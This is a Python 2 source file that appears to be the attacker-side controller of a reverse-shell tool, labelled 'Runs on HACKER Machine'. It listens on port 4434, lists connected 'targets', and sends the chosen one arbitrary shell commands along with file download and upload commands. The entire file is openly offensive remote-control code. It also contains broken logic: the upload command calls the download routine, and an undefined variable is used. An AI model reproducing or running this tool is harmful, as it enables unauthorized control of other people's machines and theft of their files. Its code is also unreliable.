1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
#!/usr/bin/python

############################
## Runs on HACKER Machine ##
############################

import os
import sys
import time
import socket
import platform

class MC:

	_sock = None
	_port = None
	_looper_host = None
	_plat = None

	FLAG = False
	BUFFER = 1024
	SHORT_INTERVAL = 0.1
	INTERVAL = 0.8
	MID_INTERVAL = 5
	LONG_INTERVAL = 10	
	SIG = "ACTIVE"

	socks = []
	clients = []


	# constructor
	def __init__(self):
		self.init()

	# initializer
	def init(cls):
		# set the a new socket
		cls._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# set looper to receive all connections
		cls._looper_host = "0.0.0.0"
		# set the port
		cls._port = 4434
		# bind connections
		cls.bind_and_listen()
		# connect
		cls.start()


	# sent data to socket
	def sendTo(cls, csock, sig):
		csock.sendall(sig)

	# receive data from socket
	def receiveFrom(cls, csock):
		data = ""
		pkt = csock.recv(cls.BUFFER)
		while(pkt):
			data =  data + pkt
			if(data != ""):
				break
			else:
				d = csock.recv(cls.BUFFER)
		return data

	# clean screen
	def clean(cls):
		cls.plat = platform.platform()
		if(cls.plat.startswith("lin") or cls.plat.startswith("Lin")):
			lin = lambda: os.system("clear")
			return lin()
		elif(cls.plat.startswith("win") or cls.plat.startswith("Win") ):
			win = lambda: os.system("cls")
			return win()
		else:
			drw = lambda: os.system("clear")
			return drw()


	# bind host & port
	def bind_and_listen(cls):
		try:
			cls._sock.bind((cls._looper_host, cls._port))
			cls._sock.listen(128)
		except socket.error as e:
			time.sleep(cls.MID_INTERVAL)
			pass


	# close and remove connections from socks & clients
	def close_remote(cls, sock):
		sock.close()
		time.sleep(cls.INTERVAL)


	# refresh connections
	def refresh(cls):
		cls.clean()
		print '\nListening for clients...\n'
		if(len(cls.clients) > 0):
			for n in range(0,len(cls.clients)):
				print "[{}] Client: {}\n".format(str(n+1), cls.clients[n])
		else:
			print "...\n"
		# print exit option
		print "---\n"
		print "[0] Exit \n"
		print "\nPress Ctrl+C to interact with client."


	# timeout socket
	def wait(cls, sec):
		cls._sock.settimeout(sec)


	# accept connection
	# return -> socket object, ip address as string
	def accept(cls):
		return cls._sock.accept()


	# download file from remote host
	def download(cls, sock, rf, lf=None):
		if( not lf):
			lf = rf
		try:
			f = open(lf, 'wb')
		except IOError as e:
			print "Error opening file.\n"
			cls.sendTo(sock, "cd .")
			return

		cls.sendTo(sock, "download "+rf)
		print "Downloading: {} >  {}".format(str(rf), str(lf))
		time.sleep(cls.INTERVAL)
		fd = cls.receiveFrom(sock)
		print "> File size: {}".format(str(len(fd)))
		time.sleep(cls.INTERVAL)
		f.write(fd)
		time.sleep(cls.INTERVAL)
		f.close()


	# upload file to remote host
	def upload(cls, sock, lf, rf=None):
		# check if file exists
		if(not rf):
			rf = lf
		try:
			g = open(lf, 'rb')
		except IOError:
			print "Error opening file.\n"
			cls.sendTo(sock, "cd .")
			return
		# start transfer
		cls.sendTo(sock, "upload "+rf)
		print "Uploading: {} > {}".format(str(lf), str(rf))
		while True:
			fd = g.read()
			if(not fd): break
			cls.sendTo(sock, fileData, "")
			print "File size: {}".format(str(len(fileData)))
		g.close()
		time.sleep(cls.INTERVAL)
		cls.sendTo(sock, "")
		time.sleep(cls.INTERVAL)


	# connect to target machine
	def start(cls):
		while True:
			cls.refresh()
			try:
				
				try:
					cls.wait(cls.LONG_INTERVAL)
					sock, addr =  cls.accept()
				except socket.timeout:
					continue
				
				if(sock):
					sock.settimeout(None)
					cls.socks.append(sock)
					cls.clients.append(addr)
				cls.refresh()
				time.sleep(cls.INTERVAL)
			
			except KeyboardInterrupt:
				cls.refresh()
				try:
					choice = input("\nSELECT TARGET: ")

					if(choice == 0):
						print "\nExiting...\n"
						for n in range(0,len(cls.socks)):
							cls.socks[n].close()
						sys.exit()
					elif(isinstance(choice, str)):
						print "Invalid input"

					choice -= 1                                                                      
					print "[!] Activating target {}".format(str(cls.clients[choice]))
					cls.FLAG = True
					cls.sendTo(cls.socks[choice], cls.SIG)
				except IndexError:
					print "Invaid Selection!"
					time.sleep(cls.INTERVAL)

			while(cls.FLAG):
				try:
					data = cls.receiveFrom(cls.socks[choice])
				# disconnection from target side
				except:
					print "\nClient disconnected... {}".format(str(cls.clients[choice]))
					cls.close_remote(cls.socks[choice])
					cls.socks.remove(cls.socks[choice])
					cls.clients.remove(cls.clients[choice])
					cls.refresh()
					cls.FLAG = False
					break
					
				#	quit -> quit the remote host connection
				if('quit' in data):
					cls.close_remote(cls.socks[choice])
					cls.socks.remove(cls.socks[choice])
					cls.clients.remove(cls.clients[choice])
					cls.refresh()
					cls.FLAG = False
					break
				elif(data != ''):
					sys.stdout.write(data)
					nextCmd = raw_input()
				
				#	download -> download a file from remote host
				if(nextCmd.startswith("download ")):
					if(len(nextCmd.split(' ')) > 2):
						cls.download(cls.socks[choice], nextCmd.split(' ')[1], nextCmd.split(' ')[2])
					else:
						cls.download(cls.socks[choice], nextCmd.split(' ')[1])
				
				#	upload -> upload a file to remote host
				elif(nextCmd.startswith("upload ")):
					if(len(nextCmd.split(' ')) > 2):
						cls.download(cls.socks[choice], nextCmd.split(' ')[1], nextCmd.split(' ')[2])
					else:
						cls.download(cls.socks[choice], nextCmd.split(' ')[1])
				
				#	any oter strings / commands
				elif(nextCmd != ''):
					cls.sendTo(cls.socks[choice], nextCmd)




		
def main():
	mc = MC()


if __name__ == '__main__':
	main()






